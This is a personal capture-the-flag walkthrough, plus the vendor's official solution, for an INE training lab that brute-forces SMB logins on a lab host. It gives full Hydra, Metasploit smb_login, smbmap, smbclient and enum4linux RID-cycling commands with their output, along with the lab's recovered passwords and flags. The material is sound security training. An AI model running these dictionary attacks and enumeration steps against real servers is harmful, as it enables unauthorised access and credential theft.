SMB (Server Message Block) is a network file sharing protocol that allows applications and users to read and write to files and request services from server programs in a computer network. In this lab we will look at the dictionary attack on SMB server.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Answer the following questions:

1. What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
2. What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
3. Which share is read only? Use smbmap with credentials obtained in question 2.
4. Is share “jane” browseable? Use credentials obtained from the 1st question.
5. Fetch the flag from share “admin”
6. List the named pipes available over SMB on the samba server? Use pipe_auditor metasploit module with credentials obtained from question 2.
7. List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2.

# Tools

- Smbmap
- Metasploit Framework
- enum4Linux
- smbclient
- Hydra

**1 What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt ?


```
hydra -l jane -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  demo.ine.local smb -t 4                                                           
```

```

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-26 13:53:57
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 1009 login tries (l:1/p:1009), ~1009 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: jane   password: abc123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-26 13:53:57
```

login: jane   password: abc123

_____

2 What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt?

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt  demo.ine.local smb -t 4    
```

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-26 13:44:38
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: admin   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-26 13:44:51
```

 login: admin   password: password1

_________

3 Which share is read only? Use smbmap with credentials obtained in question 2. ?

```
smbmap -H demo.ine.local -u admin -p password1

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
                                                                                                                                            
[+] IP: 192.31.150.3:445        Name: demo.ine.local            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        shawn                                                   READ, WRITE
        nancy                                                   READ ONLY
        admin                                                   READ, WRITE
        IPC$                                                    NO ACCESS       IPC Service (brute.samba.recon.lab)

```

ANS: nancy

_______

4 - Is share “jane” browseable? Use credentials obtained from the 1st question.
Fetch the flag from share “admin” ?

USE smbclient tools.

```
root㉿INE)-[~]
└─# smbclient //demo.ine.local/nancy -U admin
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov 28 00:55:12 2018
  ..                                  D        0  Wed Nov 28 00:55:12 2018
  srv                                 D        0  Wed Nov 28 00:55:12 2018
  tmp                                 D        0  Wed Nov 28 00:55:12 2018
  dir                                 D        0  Wed Nov 28 00:55:12 2018

                1981311780 blocks of size 1024. 68566284 blocks available
smb: \> cd srv\
smb: \srv\> ls
  .                                   D        0  Wed Nov 28 00:55:12 2018
  ..                                  D        0  Wed Nov 28 00:55:12 2018

                1981311780 blocks of size 1024. 68596588 blocks available
smb: \srv\> cd ..
smb: \> cd tmp\
smb: \tmp\> ls
  .                                   D        0  Wed Nov 28 00:55:12 2018
  ..                                  D        0  Wed Nov 28 00:55:12 2018

                1981311780 blocks of size 1024. 68596576 blocks available
smb: \tmp\> cd ..
smb: \> cd dir\
smb: \dir\> ls
  .                                   D        0  Wed Nov 28 00:55:12 2018
  ..                                  D        0  Wed Nov 28 00:55:12 2018
  flag                                N       33  Wed Nov 28 00:55:12 2018

                1981311780 blocks of size 1024. 68569628 blocks available
smb: \dir\> get flag 
getting file \dir\flag of size 33 as flag (16.1 KiloBytes/sec) (average 16.1 KiloBytes/sec)

```

 cat flag 
a1157f23d040fb4bc6f9a7277de65bf7

______

**5 Fetch the flag from share “admin” ?

```
smbclient //demo.ine.local/admin -U admin                                                                                                                                       
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 26 13:57:32 2025
  ..                                  D        0  Wed Nov 28 00:55:12 2018
  hidden                              D        0  Wed Nov 28 00:55:12 2018

                1981311780 blocks of size 1024. 68550840 blocks available
smb: \> cd hidden\
smb: \hidden\> ls
  .                                   D        0  Wed Nov 28 00:55:12 2018
  ..                                  D        0  Fri Sep 26 13:57:32 2025
  flag.tar.gz                         N      151  Wed Nov 28 00:55:12 2018

                1981311780 blocks of size 1024. 68550840 blocks available
smb: \hidden\> get flag.tar.gz 
getting file \hidden\flag.tar.gz of size 151 as flag.tar.gz (147.4 KiloBytes/sec) (average 147.5 KiloBytes/sec)
smb: \hidden\> 

```

```
tar -xf flag.tar.gz 

┌──(root㉿INE)-[~]
└─# ls
Desktop  Documents  Downloads  flag  flag.tar.gz  Music  Pictures  Public  Templates  thinclient_drives  Videos

┌──(root㉿INE)-[~]
└─# cat flag
2727069bc058053bd561ce372721c92e

```

 cat flag
2727069bc058053bd561ce372721c92e

_______

6 List the named pipes available over SMB on the samba server? Use pipe_auditor metasploit module with credentials obtained from question 2. ?


```

msf6 auxiliary(scanner/smb/pipe_auditor) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 auxiliary(scanner/smb/pipe_auditor) > set SMBUser admin
SMBUser => admin
msf6 auxiliary(scanner/smb/pipe_auditor) > set SMBPass password1
SMBPass => password1
msf6 auxiliary(scanner/smb/pipe_auditor) > run

[+] 192.31.150.3:139 - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
[*] demo.ine.local: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

ANS:  Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
________

**7 List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2. ? 

```
─# enum4linux demo.ine.local -u "admin" -p "password1"                                                                                                                             
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Sep 26 14:20:31 2025

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                           
Target ........... demo.ine.local                                                                                                                                                                                                          
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on demo.ine.local )===========================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[+] Got domain/workgroup name: RECONLABS                                                                                                                                                                                                   
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
 ===============================( Nbtstat Information for demo.ine.local )===============================
                                                                                                                                                                                                                                           
Looking up status of 192.31.150.3                                                                                                                                                                                                          
        RECONLABS       <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
        RECONLABS       <1e> - <GROUP> H <ACTIVE>  Browser Service Elections
        SAMBA-RECON-BRU <00> -         H <ACTIVE>  Workstation Service
        SAMBA-RECON-BRU <03> -         H <ACTIVE>  Messenger Service
        SAMBA-RECON-BRU <20> -         H <ACTIVE>  File Server Service

        MAC Address = 00-00-00-00-00-00

 ==================================( Session Check on demo.ine.local )==================================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.                                                                                                                                             
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
┌──(root㉿INE)-[~]
└─# enum4linux -r -u "admin" -p "password1" demo.ine.local                                                                                                           
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Sep 26 14:21:03 2025

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                           
Target ........... demo.ine.local                                                                                                                                                                                                          
RID Range ........ 500-550,1000-1050
Username ......... 'admin'
Password ......... 'password1'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on demo.ine.local )===========================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[+] Got domain/workgroup name: RECONLABS                                                                                                                                                                                                   
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
 ==================================( Session Check on demo.ine.local )==================================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[+] Server demo.ine.local allows sessions using username 'admin', password 'password1'                                                                                                                                                     
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
 ===============================( Getting domain SID for demo.ine.local )===============================
                                                                                                                                                                                                                                           
Domain Name: RECONLABS                                                                                                                                                                                                                     
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                                                                                       
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
 =================( Users on demo.ine.local via RID cycling (RIDS: 500-550,1000-1050) )=================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[I] Found new SID:                                                                                                                                                                                                                         
S-1-22-1                                                                                                                                                                                                                                   

[I] Found new SID:                                                                                                                                                                                                                         
S-1-5-32                                                                                                                                                                                                                                   

[I] Found new SID:                                                                                                                                                                                                                         
S-1-5-32                                                                                                                                                                                                                                   

[I] Found new SID:                                                                                                                                                                                                                         
S-1-5-32                                                                                                                                                                                                                                   

[I] Found new SID:                                                                                                                                                                                                                         
S-1-5-32                                                                                                                                                                                                                                   

[+] Enumerating users using SID S-1-5-21-3690628376-3985617143-2159776750 and logon username 'admin', password 'password1'                                                          
                                                                                                                                                                                    
S-1-5-21-3690628376-3985617143-2159776750-501 SAMBA-RECON-BRUTE\nobody (Local User)                                                                                                 
S-1-5-21-3690628376-3985617143-2159776750-513 SAMBA-RECON-BRUTE\None (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1000 SAMBA-RECON-BRUTE\shawn (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1001 SAMBA-RECON-BRUTE\jane (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1002 SAMBA-RECON-BRUTE\nancy (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1003 SAMBA-RECON-BRUTE\admin (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1004 SAMBA-RECON-BRUTE\Maintainer (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1005 SAMBA-RECON-BRUTE\Reserved (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1006 SAMBA-RECON-BRUTE\Testing (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username 'admin', password 'password1'                                                                                           
                                                                                                                                                                                    
S-1-22-1-1000 Unix User\shawn (Local User)                                                                                                                                          
S-1-22-1-1001 Unix User\jane (Local User)
S-1-22-1-1002 Unix User\nancy (Local User)
S-1-22-1-1003 Unix User\admin (Local User)

[+] Enumerating users using SID S-1-22-2 and logon username 'admin', password 'password1'                                                                                           
                                                                                                                                                                                    
S-1-22-2-1000 Unix Group\admins (Domain Group)                                                                                                                                      
S-1-22-2-1001 Unix Group\Maintainer (Domain Group)
S-1-22-2-1002 Unix Group\Reserved (Domain Group)
S-1-22-2-1003 Unix Group\Testing (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username 'admin', password 'password1'                                                                                           
                                                                                                                                                                                    
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                                   
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
enum4linux complete on Fri Sep 26 14:21:26 2025

```

________

## INE METHOD

**Step 1:** Open the lab link to access the Kali machine.

![Content Image](https://assets.ine.com/lab/learningpath/678a96fa018019f18ba94756fca25e7de1613983f1215cf709c833d4eb1698f0.jpg)

**Step 2:** What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt

Answer: abc123

**Commands:**

```
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
set RHOSTS demo.ine.local
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/428b515c18583c0e9c4a9901a7da886b65db39b8bb55b7dd20faf4d0fe45cad5.jpg)

**Step 3:** What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt

Answer: password1

**Commands:**

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt demo.ine.local smb
```

![Content Image](https://assets.ine.com/lab/learningpath/d6ba5947259d2e92029dc1638ffecad1c7ae8974041b8b9c6f78c27a1936b056.jpg)

**Step 4:** Which share is read only? Use smbmap with credentials obtained in question 2.

Answer: nancy

**Command:**

```
smbmap -H demo.ine.local -u admin -p password1
```

![Content Image](https://assets.ine.com/lab/learningpath/7c508b10d9f69118859668a629a5e7bade2b452833a3be71c3d1c14a9c3de8ca.jpg)

**Step 5:** Is share “jane” browseable? Use credentials obtained from the 1st question.

Answer: no

Solution: Listing the shares on the samba server:

**Commands:**

```
smbclient -L demo.ine.local -U jane
```

Enter password "abc123"

![Content Image](https://assets.ine.com/lab/learningpath/90ef1278bce0a92c1316f2172d1bf17529b5c83c47d6495c54428910a3e89002.jpg)

Share "jane" is not listed. Checking whether jane share exists:

**Command:**

```
smbclient //demo.ine.local/jane -U jane
```

![Content Image](https://assets.ine.com/lab/learningpath/ca7e15e57de0e268dcdcfd899d0b76ca405c00c65e39b29b8130a43a0245f0f0.jpg)

Share “Jane” exists but is not browsable.

**Step 6:** Fetch the flag from share “admin”.

Answer: 2727069bc058053bd561ce372721c92e

**Commands:**

```
smbclient //demo.ine.local/admin -U admin
ls
cd hidden
ls
get flag.tar.gz
exit
tar -xf flag.tar.gz
cat flag
```

![Content Image](https://assets.ine.com/lab/learningpath/0165eba20ac76e0da8a08ad9c51c419e60b5186c0b43f787383b616817286cd9.jpg)

**Step 7:** List the named pipes available over SMB on the samba server? Use pipe_auditor metasploit module with credentials obtained from question 2.

Answer: netlogon, lsarpc, samr, eventlog, InitShutdown, ntsvcs, srvsvc, wkssvc

**Commands:**

```
msfconsole -q
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
set RHOSTS demo.ine.local
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/78e1f07bdb3f215c09cf187a409fc84d2e31e61efcd6240e392f1d011e8269cb.jpg)

**Step 8:** List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2.

**Command:**

```
enum4linux -r -u "admin" -p "password1" demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/07c7fca787617998ce720f85b6d5a49372f0b8d4e1dc98330a9975f303391ae7.jpg)

![Content Image](https://assets.ine.com/lab/learningpath/91317593ad613875d83c087ba16973aa2be07cd9aedb96e0b3293f575ad8c587.jpg)

Answer: S-1-22-1-1000, S-1-22-1-1001, S-1-22-1-1002, S-1-22-1-1003

# Conclusion

In this lab, we learned about the dictionary attack on SMB server.

# References

1. [Samba](https://www.samba.org/)
2. [smbmap](https://tools.kali.org/information-gathering/smbmap)
3. [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
4. [THC Hydra](https://tools.kali.org/password-attacks/hydra)
5. [Metasploit Module: SMB Login Check Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_login)
6. [Metasploit Module: SMB Session Pipe Auditor](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/pipe_auditor)
7. [enum4Linux](https://tools.kali.org/information-gathering/enum4linux)